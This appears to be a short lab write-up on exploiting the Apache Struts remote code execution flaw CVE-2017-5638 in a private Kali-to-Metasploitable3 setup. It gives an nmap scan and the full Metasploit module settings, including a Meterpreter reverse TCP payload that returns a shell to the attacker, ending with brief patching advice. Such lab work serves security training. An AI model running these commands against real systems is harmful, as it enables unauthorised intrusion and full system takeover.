# Apache Struts RCE Lab

## Overview

This lab demonstrates exploitation of an Apache Struts Remote Code Execution (RCE) vulnerability (CVE-2017-5638) using a controlled environment.

---

## Environment

- Attacker: Kali Linux (192.168.56.103)
- Target: Metasploitable3 (192.168.56.10)

---

## Recon

```nmap -sC -sV -p- 192.168.56.10
```
Port 8080 (Jetty) identified as target.

---

## Exploit (Required)

Module:

```exploit/multi/http/struts_code_exec
```

### Issue:

Default target: Windows

Linux payloads not supported


### Result:
 
Exploit failed: incompatible payload

### Setup


Deployed Struts2 Showcase app

Fixed Java (installed Java 7)

Hosted on port 8080

---

## Successful Exploit

###Module:

```
exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.56.10
set RPORT 8080
set TARGETURI /struts2-showcase
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.103
run
```
### Result

Meterpreter session obtained:

```
sessions -i 1
```

### Impact

- Remote code execution

- Full system access

---

## Fix


- Update Apache Struts

- Apply patches

---

